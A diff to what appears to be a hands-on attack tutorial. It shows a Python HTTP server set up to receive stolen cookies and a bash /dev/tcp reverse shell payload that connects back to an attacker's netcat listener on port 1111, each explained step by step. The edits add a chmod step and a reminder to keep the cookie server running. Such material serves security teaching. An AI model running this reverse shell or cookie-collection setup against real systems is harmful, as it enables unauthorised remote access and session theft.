@@ -63,7 +63,7 @@ For this attack we need the following ingredients:
 
 ##### 1. Setting up the server
 
-The purpose of this step is to set up a server to receive the stolen cookie. Use a basic HTTP server on port 8001 that will log incoming requests. The server listens for incoming HTTP requests. In this attack, it will receive requests containing the victim's cookies. Type in a new CLI:
+The purpose of this step is to set up a server (let's call it server1) to receive the stolen cookie. Use a basic HTTP server on port 8001 that will log incoming requests. The server listens for incoming HTTP requests. In this attack, it will receive requests containing the victim's cookies. Type in a new CLI:
 
 ```
 python3 -m http.server 8001
@@ -132,6 +132,8 @@ Open a new terminal tab and create a file `vim payload.sh` with the following co
 /bin/bash -c 'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'
 ```
 
+Make the payload executable with `chmod +x payload.sh`. The content:
+
 1. `/bin/bash -c`: Tells the CLI to run the following command using the bash shell.
 2. `'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'`: The core of the reverse shell command. `exec bash -i` This starts an interactive bash shell. `/dev/tcp/` is a Bash feature that allows TCP connections to be treated like files, when a program writes to this path it actually sends data over the network to the specified IP address and port ({IP}/1111). `0>&1`makes the standard input of the Bash shell read from the TCP connection.
 
@@ -160,4 +162,4 @@ nc -nvlp 1111
 2. The payload `/bin/bash -c 'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'` is executed on the target machine. This command on the target machine opens a reverse shell, connecting back to the attacker’s machine on port 1111.
 3. The target machine connects to the attacker’s Netcat listener, establishing a reverse shell session. The attacker can now interact with the target machine’s shell through this connection.
 
-Let's continue with the situation.
+Let's continue with the situation. Be sure to not to close server1
